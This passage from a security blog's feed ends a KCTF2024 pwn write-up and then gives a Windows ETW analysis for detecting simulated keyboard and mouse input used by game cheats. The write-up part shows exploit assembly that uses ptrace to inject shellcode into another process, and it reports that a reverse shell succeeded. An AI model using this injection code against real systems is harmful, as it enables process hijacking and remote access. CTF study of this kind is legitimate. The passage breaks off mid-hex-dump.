rcx</span></span><br><span class="line"><span class="string">add rcx,0x880</span></span><br><span class="line"><span class="string">mov rdx,[rcx]</span></span><br><span class="line"><span class="string">/*RIP offset*/</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">add rcx,0x200</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">/*inject shellcode*/</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">mov rbx,0x100</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    push rcx</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    mov edi,4/*pokedata*/</span></span><br><span class="line"><span class="string">    mov rsi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">    mov r10,[rcx]</span></span><br><span class="line"><span class="string">    mov eax,SYS_ptrace</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    add rcx,8</span></span><br><span class="line"><span class="string">    add rdx,8</span></span><br><span class="line"><span class="string">    push rcx</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    sub rbx,8</span></span><br><span class="line"><span class="string">    test rbx,rbx</span></span><br><span class="line"><span class="string">    jnz loop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi,7</span></span><br><span class="line"><span class="string">mov rsi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov r10,0</span></span><br><span class="line"><span class="string">mov eax,SYS_ptrace</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,17</span></span><br><span class="line"><span class="string">mov rsi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov r10,0</span></span><br><span class="line"><span class="string">mov eax,SYS_ptrace</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=asm(shellcode).ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\0&#x27;</span>)+inject_shellbytes</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=inject_shellbytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.close()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>当时试了一个 pid&#x3D;17 就反弹成功了。</p><img src="/2024/09/02/KCTF2024/5.png" class=""><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>其实这题解法应该挺多的，因为直接给了 root 权限，所以直接去写启动的二进制文件也不是不可以，把沙箱代码 patch 掉直接shellcode执行 sh，或者不用反弹shell，直接 orw 出了 flag udp 直接发过来也可以，总归它出网想要外带信息还是非常容易的。</p>]]></content>
    
    
    <summary type="html">KCTF2024第八题——星门 writeup</summary>
    
    
    
    <category term="ctf" scheme="https://xia0ji233.github.io/categories/ctf/"/>
    
    <category term="pwn" scheme="https://xia0ji233.github.io/categories/ctf/pwn/"/>
    
    
    <category term="ptrace" scheme="https://xia0ji233.github.io/tags/ptrace/"/>
    
  </entry>
  
  <entry>
    <title>etw机制分析</title>
    <link href="https://xia0ji233.github.io/2024/07/08/etw/"/>
    <id>https://xia0ji233.github.io/2024/07/08/etw/</id>
    <published>2024-07-08T02:00:00.000Z</published>
    <updated>2024-07-08T14:13:09.458Z</updated>
    
    <content type="html"><![CDATA[<p>尝试做一做模拟类外挂检测</p><span id="more"></span><h2 id="鼠标-键盘模拟监控"><a href="#鼠标-键盘模拟监控" class="headerlink" title="鼠标-键盘模拟监控"></a>鼠标-键盘模拟监控</h2><p>鼠标-键盘模拟外挂相较于直接读&#x2F;写内存的外挂相比，更加安全和可靠，因为它本质还是模拟人去操作的，只要频率设置不过分，那么不管是客户端检测还是服务端检测都是难以察觉的，因此这几天在思考一个可以检测这类外挂的方案。</p><h3 id="ETW"><a href="#ETW" class="headerlink" title="ETW"></a>ETW</h3><p>Windows (ETW) 的事件跟踪提供一种机制来跟踪和记录由用户模式应用程序和内核模式驱动程序引发的事件。 ETW 在 Windows 操作系统中实现，为开发人员提供了一组快速、可靠且通用的事件跟踪功能[1]。</p><p>经过深入的研究，发现 ETW 可以监控很多东西，上到进程创建，下到 UDP&#x2F;TCP 数据包监控，无所不能。</p><h3 id="想法构思"><a href="#想法构思" class="headerlink" title="想法构思"></a>想法构思</h3><p>那么既然 ETW 给了一种可以在 r3 层监控大量信息的机制，那么是否可以做到监控真实的键盘按键呢？如果能做到，配合 Windows 的消息监控便可以达到检测键盘-鼠标模拟的功能，因为鼠标模拟本质是直接通过 Windows API 发送消息，而不会经过键盘，所以如果检测到了按键消息而没有检测到真实按键的话，就可以判断为使用了鼠标-键盘模拟。</p><p>如果去搜索 etw 键盘监控，大概率是只能搜到这个 8 年前的老项目 <a href="https://github.com/CyberPoint/Ruxcon2016ETW%EF%BC%8C%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%98%AF">https://github.com/CyberPoint/Ruxcon2016ETW，这个项目是</a> C# 写的，虽然可以运行，但是监控是监控不了一点的。</p><p>但是很幸运的是，有人发布了最新的键盘模拟检测 <a href="https://github.com/Oliver-1-1/EtwKeyboardDetection%EF%BC%8C%E7%84%B6%E8%80%8C%E6%88%91%E8%87%AA%E5%B7%B1%E6%B5%8B%E8%AF%95%E4%B8%8B%E6%9D%A5%E6%98%AF%E6%B2%A1%E6%9C%89%E6%95%88%E6%9E%9C%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E5%AE%83%E7%9A%84%E6%A1%86%E6%9E%B6%E5%86%99%E7%9A%84%E8%BF%98%E6%98%AF%E9%9D%9E%E5%B8%B8%E4%B8%8D%E9%94%99%E7%9A%84%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%80%9F%E7%94%A8%E5%8F%82%E8%80%83%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%AE%83%E8%8E%B7%E5%8F%96%E4%BA%86">https://github.com/Oliver-1-1/EtwKeyboardDetection，然而我自己测试下来是没有效果的，但是它的框架写的还是非常不错的，可以借用参考一下，它获取了</a> Microsoft-Windows-USB-UCX 这个 provider 的全部事件。</p><p>这里参考一个<a href="https://github.com/performancecopilot/pcp/blob/main/src/pmdas/etw/tdhconsume.c">项目</a>的框架，去打印 event 的信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function">    <span class="title">PrintEventInfo</span><span class="params">(PTRACE_EVENT_INFO pInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (DecodingSourceWbem == pInfo-&gt;DecodingSource)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;EventInfo: MOF class event\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (DecodingSourceXMLFile == pInfo-&gt;DecodingSource)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;EventInfo: XML manifest event\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (DecodingSourceWPP == pInfo-&gt;DecodingSource)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;EventInfo: WPP event\n&quot;</span>);</span><br><span class="line">    <span class="comment">/*此处略去大量代码，具体信息可以查看项目代码*/</span></span><br><span class="line">    <span class="keyword">if</span> (pInfo-&gt;RelatedActivityIDNameOffset &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;Related activity ID name: %s\n&quot;</span>,</span><br><span class="line">                (LPWSTR)((PBYTE)(pInfo) + pInfo-&gt;RelatedActivityIDNameOffset));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它会刷新大量的 26 号和 27 号的事件</p><img src="/2024/07/08/etw/1.png" class=""><p>官方也提供了抓取 usb 事件的方式[2]。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">logman create trace -n usbtrace -o %SystemRoot%\Tracing\usbtrace.etl -nb 128 640 -bs 128</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-USBXHCI (Default,PartialDataBusTrace)</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-UCX (Default,PartialDataBusTrace)</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-USBHUB3 (Default,PartialDataBusTrace)</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-USBPORT</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-USBHUB</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-Kernel-IoTrace 0 2</span><br><span class="line">logman start -n usbtrace</span><br></pre></td></tr></table></figure><p>停止抓取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logman stop -n usbtrace</span><br><span class="line">logman delete -n usbtrace</span><br><span class="line">move /Y %SystemRoot%\Tracing\usbtrace_000001.etl %SystemRoot%\Tracing\usbtrace.etl</span><br></pre></td></tr></table></figure><p>最后会生成一个 usbtrace.etl 文件。</p><img src="/2024/07/08/etw/2.png" class=""><p>时间轴也可以见到一直是出现 26 和 27 号的事件，所以主要分析的就是这两个事件。</p><p>这里我又参考了另一<a href="https://github.com/MSDN-WhiteKnight/HidLogger/blob/master/HidLogger.cs">项目</a>，是 C# 写的，但是略微可以看出一二。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> UsbData <span class="title">GetData</span>(<span class="params">TraceEvent eventData</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ulong</span> hndl;</span><br><span class="line">    <span class="built_in">object</span> field;</span><br><span class="line">    <span class="built_in">uint</span> vid=<span class="number">0</span>,pid=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">byte</span> usbver = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//try to determine device handle and IDs</span></span><br><span class="line">    field = GetItem(eventData, <span class="string">&quot;fid_USBPORT_Device&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (field != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; deviceInfo = _expose(field);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">ulong</span>.TryParse(deviceInfo[<span class="string">&quot;DeviceHandle&quot;</span>], <span class="keyword">out</span> hndl) &amp;&amp; hndl &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        vid = UInt32.Parse(deviceInfo[<span class="string">&quot;idVendor&quot;</span>]);</span><br><span class="line">        pid = UInt32.Parse(deviceInfo[<span class="string">&quot;idProduct&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        hndl = (<span class="built_in">ulong</span>)GetItem(eventData, <span class="string">&quot;fid_PipeHandle&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (hndl &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//try to get event parameters</span></span><br><span class="line">    field = GetItem(eventData, <span class="string">&quot;fid_USBPORT_URB_BULK_OR_INTERRUPT_TRANSFER&quot;</span>); <span class="comment">//2.0</span></span><br><span class="line">    usbver = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (field == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        field = GetItem(eventData, <span class="string">&quot;fid_UCX_URB_BULK_OR_INTERRUPT_TRANSFER&quot;</span>); <span class="comment">//3.0</span></span><br><span class="line">        usbver = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; urb = _expose(field);<span class="comment">//transform parameter string to dictionary</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//determine transferred data length</span></span><br><span class="line">    <span class="built_in">int</span> xferDataSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">int</span>.TryParse(urb[<span class="string">&quot;fid_URB_TransferBufferLength&quot;</span>], <span class="keyword">out</span> xferDataSize))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> ((xferDataSize &gt; <span class="number">8</span>) &amp;&amp; (usbver == <span class="number">2</span>)) xferDataSize = <span class="number">8</span>; <span class="comment">//USB 2.0 sometimes gives wrong size </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (xferDataSize &gt; <span class="number">8</span>) <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">//data is too large for mouse / keyboard</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">byte</span>[] data2=eventData.EventData();</span><br><span class="line">    <span class="built_in">byte</span>[] xferData = <span class="keyword">new</span> <span class="built_in">byte</span>[xferDataSize];</span><br><span class="line">    Array.Copy(data2, eventData.EventDataLength - xferDataSize, xferData, <span class="number">0</span>, xferDataSize);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">bool</span> HasNonZero = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; xferDataSize; i++)</span><br><span class="line">        <span class="keyword">if</span> (xferData[i] != <span class="number">0</span>) &#123; HasNonZero = <span class="literal">true</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (HasNonZero == <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">//data is empty</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Construct UsbData object*/</span></span><br><span class="line">    UsbData data = <span class="keyword">new</span> UsbData(eventData.TimeStamp, hndl, xferData);</span><br><span class="line">    data.usbver = usbver;</span><br><span class="line">    data.datalen = (<span class="built_in">uint</span>)xferDataSize;</span><br><span class="line">    data.vid = vid;</span><br><span class="line">    data.pid = pid;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚好和我主要参考的框架的事件处理中有相似之处。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function">    <span class="title">EtwCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in PEVENT_RECORD Event</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD size;</span><br><span class="line">    PTRACE_EVENT_INFO trace;</span><br><span class="line">    PWCHAR provider;</span><br><span class="line">    EVENT_PROPERTY_INFO property;</span><br><span class="line">    EVENT_PROPERTY_INFO iProperty;</span><br><span class="line"></span><br><span class="line">    trace = <span class="built_in">GetEventData</span>(Event, &amp;size);</span><br><span class="line"></span><br><span class="line">    provider = (PCHAR)trace + trace-&gt;ProviderNameOffset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (UINT countIndex = <span class="number">0</span>;</span><br><span class="line">         countIndex &lt; trace-&gt;TopLevelPropertyCount;</span><br><span class="line">         countIndex = countIndex + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        EVENT_PROPERTY_INFO  property = trace-&gt;EventPropertyInfoArray[countIndex];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(<span class="string">L&quot;fid_UCX_URB_BULK_OR_INTERRUPT_TRANSFER&quot;</span>, (PCHAR)trace + property.NameOffset))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (INT propertyIndex = property.structType.StructStartIndex;</span><br><span class="line">                 propertyIndex &lt; property.structType.StructStartIndex + property.structType.NumOfStructMembers;</span><br><span class="line">                 propertyIndex = propertyIndex + <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                iProperty = trace-&gt;EventPropertyInfoArray[propertyIndex];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(<span class="string">L&quot;fid_URB_TransferBufferLength&quot;</span>, (PCHAR)trace + iProperty.NameOffset))</span><br><span class="line">                &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    <span class="comment">//Get value of fid_URB_TransferBufferLength</span></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">                    LPCWSTR string = <span class="built_in">GetPropertyData</span>(</span><br><span class="line">                        trace,</span><br><span class="line">                        Event,</span><br><span class="line">                        iProperty,</span><br><span class="line">                        <span class="number">20</span>); <span class="comment">// index for fid_URB_TransferBufferLength</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (string == <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    <span class="comment">// Filter out for only keyboard packets by size</span></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(string, <span class="string">L&quot;0xC&quot;</span>))</span><br><span class="line">                    &#123;</span><br><span class="line">                        etwCount = etwCount + <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">free</span>(string);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(trace);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前者，会判断 <code>fid_URB_TransferBufferLength</code> 这个属性的属性值，进行一些判断，根据注释也可以看明白，在当时的年代，可能鼠标事件的这个长度是 4 或者 5，键盘事件的长度是 8，超出则该事件不是键盘或者鼠标的点击或移动事件。</p><p>后者同样是取出值判断是否为 0xC，来检查是不是键盘事件，若是则让 etwCount+1。这里需要说明的是，这个项目的原理和我的构思是差不多的，它hook了windows消息，每次获得 F1 键的消息时会判断这次点击是不是 F1，然后根据 etwCount 和win32Count 的值做比对，看看是不是四倍的关系，若是则没有使用键盘模拟。</p><p>实际测试的时候，键盘按下时消息长度的对应属性值应该是 0x25，鼠标移动和点击事件的长度对应的属性值为 0x9。今非昔比了，改了也可以理解。</p><p>而按下按键的时候有概率触发 8 个事件，也有可能触发 6 个事件，也有可能是4个事件，这个好像还真是看脸了。但是通过一个驱动模拟按键则是不会触发任何 etw 的事件。鼠标点击来说，每次触发 4 个事件是没有问题的。</p><p>检测键盘的思路就是，每次收到键盘的etw事件，让etw计数器 +1，同时 hook windows 消息，每次接收到非F1的按键也让按键计数器 +1，最后只要 <code>etwCount &lt; 6*Win32Count</code> 则可以直接判定为使用了键盘模拟。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>这里让etw每次记录时输出，keyboard每次收到消息时输出当前按键次数。</p><p>首先是正常情况下的按键。</p><img src="/2024/07/08/etw/3.png" class=""><p>因为etw接受消息有一定的延迟，所以中间输出结果可能有点不对，但是最终结果是在偏差范围内的，即 <code>4*Win32Count&lt;=etwCount&lt;=8*Win32Count</code>。</p><p>一般上限不会超，所以检测下限即可。</p><img src="/2024/07/08/etw/4.png" class=""><p>自然是不会超的。</p><p>如果是按键模拟，这里我找了一个开源项目的模拟按键来测试。</p><p>它可以一直触发消息而不触发 etw。</p><img src="/2024/07/08/etw/5.png" class=""><p>结果自然而然的是会触发到模拟器检测的。</p><p>虽然不知道它按键数据怎么分析，而且会有一定的随机性，但是对于检测模拟类外挂来说足矣。只要取一段区间，它的模拟按键次数大于实际键盘按键次数，那么必能检测到的，通过一定的数学推导也不难得到。</p><h3 id="深入了解"><a href="#深入了解" class="headerlink" title="深入了解"></a>深入了解</h3><p>因为这个协议没有被文档话，而根据 8 年前的 poc 去解析协议得到的是全 0 数据，那么只能是想办法自己找准具体的协议了。</p><p>首先按 <code>aba</code> 得到所有跟键盘事件相关的事件包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 69 57 4d 88 b5 ff ff e0 65 9c 61 88 b5 ff ff 80 00 09 00 00 00 00 40 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 90 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 69 57 4d 88 b5 ff ff 50 43 b5 56 88 b5 ff ff 80 00 09 00 00 00 00 40 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 90 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 69 57 4d 88 b5 ff ff f0 63 d8 61 88 b5 ff ff 80 00 09 00 00 00 00 40 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 90 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>这里都取第一个抓到的数据，可以发现第一个数据包只有 +20 开始往后 4 个字节不一样，而且相同按键之间似乎没有太多联系。一次键盘事件可以看作是键盘按下和弹起两个子事件，而这两个子事件分别会触发 2 或者 4 个etw事件。</p><p>通过研究事件的关系可以看出，按下的时候，若开始事件为 26，则接下来到来的事件还是 26，随后是 27，26。如果开始事件是 27，则之后单走一个 26。弹起大部分情况都是 <code>(27,26)*2</code>，长度为 4 的比较难复现出来，但是可以通过排除连续的 2 个 26 事件达到尽可能地使得随机性减少。</p><blockquote><p>这里解释一下我描述的事件，我上面两段话所说的“到来的事件”均指的是携带了键盘数据的 etw 事件。根据时间轴来看，事件到来的顺序是 26 与 27 交替到来，那么从时间轴来看，“连续的两个 26 事件”指的是两个携带了键盘数据的 26 事件中间夹杂了一个没有携带键盘数据的 27 事件。</p><p>而携带键盘数据正如最开始解释的，<code>fid_URB_TransferBufferLength</code> 属性值为 0x25 的事件。</p></blockquote><p>从抓包数据可以分析。</p><img src="/2024/07/08/etw/6.png" class=""><ul><li>27 事件的数据长度为 172。</li><li>26 事件的数据长度为 168。</li></ul><p>从上面分析的抓包信息得知，抓到的数据包都是 26 事件，因此可以尝试抓 aba 键盘按下所产生的 27 事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 69 57 4d 88 b5 ff ff 50 24 f0 5d 88 b5 ff ff 80 00 09 00 00 00 00 00 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 90 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 89 57 4d 88 b5 ff ff e0 4c f0 5d 88 b5 ff ff 80 00 09 00 00 00 00 00 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 d0 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 89 57 4d 88 b5 ff ff e0 4c 